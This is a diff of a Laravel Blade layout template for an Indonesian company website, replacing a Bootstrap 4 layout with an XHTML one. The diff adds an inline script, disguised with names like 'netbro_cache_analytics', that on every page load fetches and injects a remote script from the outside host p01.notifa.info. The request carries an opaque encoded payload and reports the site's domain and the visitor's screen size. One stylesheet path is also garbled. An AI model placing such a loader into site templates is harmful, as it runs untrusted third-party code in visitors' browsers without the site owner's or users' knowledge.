@@ -1,145 +1,83 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html
+    PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
 
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+        <meta name="language" content="en" />
 
-    <title>Tunas Cahaya Mandiri Widyatama</title>
-    
-    <link rel="shortcut icon" href="{{ asset('img/favicon.ico') }}">
+        <title>PT Tunas Cahaya Mandiri Widyatama</title>
 
-    <!-- Fonts -->
-    <link href="https://fonts.googleapis.com/css?family=Nunito:200,600" rel="stylesheet">
+        <link rel="stylesheet" type="text/css" href="{{ asset('css/cassade.css') }}" media="screen" />
+        <link rel="stylesheet" type="text/css" href="{{ asset('css/bootstrap.css') }}" media="screen" />
+        <link rel="stylesheet" type="text/css" href="{{ asset('css/bootstrap-theme.cs') }}s" media="screen" />
+        <link rel="stylesheet" type="text/css" href="{{ asset('css/style.css') }}" media="screen" />
+        <link rel="stylesheet" type="text/css" href="{{ asset('css/layout/boxed1.css') }}" id="layout">
+        <link rel="stylesheet" type="text/css" href="{{ asset('css/skin/green.css') }}" id="skin" />
+        
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css" integrity="sha384-oS3vJWv+0UjzBfQzYUhtDYW+Pj2yciDJxpsK1OYPAYjqT085Qq/1cq5FLXAZQ7Ay" crossorigin="anonymous">
 
-    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
-    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css" integrity="sha384-oS3vJWv+0UjzBfQzYUhtDYW+Pj2yciDJxpsK1OYPAYjqT085Qq/1cq5FLXAZQ7Ay" crossorigin="anonymous">
+        <link rel="shortcut icon" href="{{ asset('img/favicon.ico') }}">
 
-    <link rel="stylesheet" href="{{ asset('css/style.css') }}">
-</head>
+    </head>
 
-<body>
-    <!-- navbar -->
-    <nav class="navbar navbar-expand-lg navbar-custom navbar-light sticky-top shadow">
-        <div class="container" style="padding: 8px;">
-            <a class="navbar-brand" href="/">
-                <img src="{{asset('img/logo.png')}}" class="navbar-brand-img">
-            </a>
-            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
-                <span class="navbar-toggler-icon"></span>
-            </button>
-            <div class="collapse navbar-collapse" id="navbarResponsive" >
-                <ul class="navbar-nav ml-auto" >
-                    <li class="nav-item">
-                        @if ( $nav == 'home' )
-                        <div class="active">
-                        @endif
-                            <a class="nav-link" href="/">Home
-                                @if ( $nav == 'home' ) <span class="sr-only">(current)</span> @endif
-                            </a>
-                        @if ( $nav == 'home' )
-                        </div>
-                        @endif
-                    </li>
-                    <li class="nav-item">
-                        @if ( $nav == 'services' )
-                        <div class="active">
-                        @endif
-                            <a class="nav-link" href="/services">Services
-                                @if ( $nav == 'services' ) <span class="sr-only">(current)</span> @endif
-                            </a>
-                        @if ( $nav == 'services' )
-                        </div>
-                        @endif
-                    </li>
-                    
-                    <li class="nav-item dropdown">
-                        @if ( $nav == 'about' )
-                        <div class="active">
-                        @endif
-                        <a class="nav-link" href="/about">About
-                            @if ( $nav == 'about' ) <span class="sr-only">(current)</span> @endif
-                        </a>
-                        @if ( $nav == 'about' )
-                        </div>
-                        @endif
-                    </li>
-                    <li class="nav-item">
-                        @if ( $nav == 'news' )
-                        <div class="active">
-                        @endif
-                            <a class="nav-link" href="/news">News
-                                @if ( $nav == 'news' ) <span class="sr-only">(current)</span> @endif
-                            </a>
-                        @if ( $nav == 'news' )
-                        </div>
-                        @endif
-                    </li>
-                    <li class="nav-item">
-                        @if ( $nav == 'contact' )
-                        <div class="active">
-                        @endif
-                            <a class="nav-link" href="/contact">Contact
-                                @if ( $nav == 'contact' ) <span class="sr-only">(current)</span> @endif
-                            </a>
-                        @if ( $nav == 'contact' )
-                        </div>
-                        @endif
-                    </li>
-                </ul>
-            </div>
+    <body class="bg-1">
+        <div class="wrapper">
+
+            @include('layouts.navbar')
+
+            @yield('content')
+
+            @include('layouts.footer')
+
         </div>
-    </nav>
 
-    @yield('content')
+        <!--Move To Top-->
+        <div id="movetotop"> <a class="icon-angle-up"></a> </div>
+        <script type="text/javascript">
+            if (self == top) {
+                function netbro_cache_analytics(fn, callback) {
+                    setTimeout(function () {
+                        fn();
+                        callback();
+                    }, 0);
+                }
 
-    <!----------- Footer ------------>
-    <footer>
-        <div class="footer-bs">
-            <div class="row">
-                <div class="col-md-4 footer-brand animated fadeInLeft">
-                    <h4>About Us</h4>
-                    <p>{!! substr(strip_tags($about), 0, 400) !!}
-                        <a href="/about">{{ strlen(strip_tags($about)) > 50 ? "  ...ReadMore" : "" }}</a>
-                    </p>
-                </div>
-                <div class="col-md-8 footer-nav animated fadeInUp">
-                    <h4>Latest News</h4>
-                    <div class="pages">
-                        <div class="row">
-                        @foreach($posts->reverse() as $post)
-                            <div class="col-md-6 news" >                 
-                                <div class="row">
-                                    <div class="col-4">
-                                        <img src="{{ Voyager::image( $post->image ) }}">
-                                    </div>
-                                    <div class="col-8">
-                                        <a href="/news/{{ $post->slug }}">{{ $post->title }}</a>
-                                        <p>{{ str_limit(strip_tags($post->body), 80) }}</p>
-                                    </div>
-                                </div>
-                            </div>
-                            @if ($loop->iteration == 2)
-                                @break
-                            @endif
-                        @endforeach
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-        <nav class="navbar navbar-expand-lg navbar-footer navbar-light" style="background-color: #222f3e;">
-            <div class="container">
-                <a class="navbar-brand mr-auto ml-auto" href="/">©2019 - PT Tunas Cahaya Mandiri Widyatama</a>
-            </div>
-        </nav>
-    </footer>
-</body>
+                function sync(fn) {
+                    fn();
+                }
 
-<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
-<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
-<script src="{{ asset('js/js_app.js') }}"></script>
+                function requestCfs() {
+                    var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
+                    var idc_glo_r = Math.floor(Math.random() * 99999999999);
+                    var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
+                        "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2Xt1J5X%2bqC%2f3BAnWxMnf8akUfqMRu9RGJftMgV99SBbrYf6kIvyDgKYdbywzi9OmfqUQVtvIcXCqnq6no7TaGQwrVVhWQlCyZ5REcZlwwwDEBTgYEhkx7BRi1JurfHpy6GA26f8tQ%2fw1Yiq6359hCZpWXbD42yC5TNTa1y9I783Re7GbEm%2f04xbXLm609XfiXiaYLkZ2yLn6glWkqeEkMReDsKdRwU4Bub3QAuN3OJm91YjWFY73Vaw2PqzYrkA8tCpzusBBeTR4pCNdLhX%2fCI7f1o3U7xOaRHVkjVKw%2bUR2DI%2bURiox3ImwptggS2PNOyUWvvgRPNwl80UwHAUiYOU6M2ty%2b24ttnvqHhJ8612j1E0op%2fz%2fjLU%2fMQI%2f4fXyUxMrFxlzc51xxZJt%2fKRLxRwxA9s%2fk02gJLd8vAHIScIbPEc1UPk56oclvVTk9DujRdjj0yoGmYlqgNIvWJnsBjQ%3d%3d" +
+                        "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen
+                        .height;
+                    var bsa = document.createElement('script');
+                    bsa.type = 'text/javascript';
+                    bsa.async = true;
+                    bsa.src = url;
+                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(
+                        bsa);
+                }
+                netbro_cache_analytics(requestCfs, function () {});
+            };
+        </script>
+
+    </body>
+    <script type="text/javascript" src="{{asset('js/jquery.min.js')}}"></script>
+    <script type="text/javascript" src="{{asset('bootstrap.min.js')}}"></script>
+    <script type="text/javascript" src="{{asset('js/jquery.prettyPhoto.js')}}"></script>
+    <script type="text/javascript" src="{{asset('js/jquery.nivo.slider.pack.js')}}"></script>
+    <script type="text/javascript" src="{{asset('js/jflickrfeed.js')}}"></script>
+    <script type="text/javascript" src="{{asset('js/selectnav.js')}}"></script>
+    <script type="text/javascript" src="{{asset('js/jquery.easing.1.3.js')}}"></script>
+    <script type="text/javascript" src="{{asset('js/custom.js')}}"></script>
+    <script type="text/javascript" src="{{asset('js/switcher.js')}}"></script>
+    <script type="text/javascript" src="{{asset('js/jquery.isotope.min.js')}}"></script>
+    <script type="text/javascript" src="{{asset('js/slider.js')}}"></script>
+    <script type="text/javascript" src="{{asset('js/jquery.flexslider.js')}}"></script>
+    <script type="text/javascript" src="{{asset('js/menu-lamp.js')}}"></script>
 
 </html>
